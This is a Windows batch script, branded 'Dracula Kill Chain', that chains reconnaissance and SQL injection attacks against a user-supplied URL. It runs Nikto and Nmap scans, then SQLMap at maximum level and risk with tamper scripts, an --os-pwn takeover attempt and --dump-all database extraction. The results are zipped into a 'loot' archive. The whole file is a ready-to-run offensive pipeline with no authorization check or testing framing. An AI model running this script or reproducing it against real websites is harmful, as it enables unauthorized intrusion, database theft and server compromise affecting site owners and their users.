@echo off
title 🦇 Dracula Kill Chain - Elite Edition FINALIZED
color 0C
cd /d "%~dp0"
setlocal EnableDelayedExpansion

:: Create loot directory if it doesn't exist
if not exist "loot" mkdir loot

:: Check Python
where python >nul 2>nul
if errorlevel 1 (
    echo [!] Python is required but not found. Please install Python 3.x and add to PATH.
    pause
    exit /b
)

:: Check SQLMap
if exist "sqlmap\sqlmap.py" (
    set sqlmap_cmd=python sqlmap\sqlmap.py
) else (
    echo [!] SQLMap not found in sqlmap\sqlmap.py
    pause
    exit /b
)

:: Timestamped output folder
set "stamp=%date:~10,4%-%date:~4,2%-%date:~7,2%_%time:~0,2%-%time:~3,2%-%time:~6,2%"
set "stamp=!stamp: =0!"
set "output=loot\dracula_!stamp!"
mkdir "!output!" >nul 2>&1

:: Get URL from user
set /p target_url=Enter full target URL (with injectable param): 
if "%target_url%"=="" (
    echo [!] No URL given.
    pause
    exit /b
)

echo [+] Target: %target_url%
echo [+] Output Dir: !output!
echo [+] Logging enabled...

:: === PHASE 1: robots.txt discovery ===
echo [1/7] 📜 Checking for disallowed paths via robots.txt...
curl %target_url%/robots.txt > "!output!\robots_found.txt" 2>&1

:: === PHASE 2: Nikto scan (Perl) ===
if exist "nikto\nikto.pl" (
    echo [2/7] 🕷️ Running Nikto vulnerability scan...
    cd nikto
    perl nikto.pl -h %target_url% -output ..\!output!\nikto_results.txt
    cd ..
) else (
    echo [!] Nikto not found, skipping...
)

:: === PHASE 3: Nmap scan ===
echo [3/7] 📡 Running Nmap port/service scan...
nmap -Pn -sV -T4 %target_url% -oN "!output!\nmap_results.txt"

:: === PHASE 4: SQLMap Recon + Dump ===
echo [4/7] 🧠 SQLMap recon deep scan...
!sqlmap_cmd! -u "%target_url%" --crawl=3 --level=5 --risk=3 --random-agent --batch --forms --technique=BEUSTQ --tamper=space2comment --output-dir="!output!" --threads=6 --os-pwn --dbs >> "!output!\sqlmap_log.txt" 2>&1

echo [5/7] 💾 SQLMap dumping all data...
!sqlmap_cmd! -u "%target_url%" --dump-all --batch --output-dir="!output!" >> "!output!\sqlmap_log.txt" 2>&1

:: === PHASE 5: Raw HTML Capture ===
echo [6/7] 🧛 Capturing HTML snapshot...
curl "%target_url%" -o "!output!\html_snap.html"

:: === PHASE 6: Dracula Part 2 Elite Scan (Python) ===
if exist "Dracula_Part2_Elite.py" (
    echo [7/7] 🦇 Running Dracula Part 2 Elite module...
    python Dracula_Part2_Elite.py --target "%target_url%" --output "!output!"
) else (
    echo [!] Dracula_Part2_Elite.py not found. Skipping Part 2 advanced scan...
)

:: === FINALIZE ===
echo 🗃️ Zipping everything up...
powershell -Command "Compress-Archive -Path '!output!\*' -DestinationPath 'loot\\DraculaElite_Loot_!stamp!.zip'"

echo.
echo ===================================================
echo [✔] Dracula Kill Chain completed.
echo [📂] Loot saved to: loot\\DraculaElite_Loot_!stamp!.zip
echo ===================================================
pause
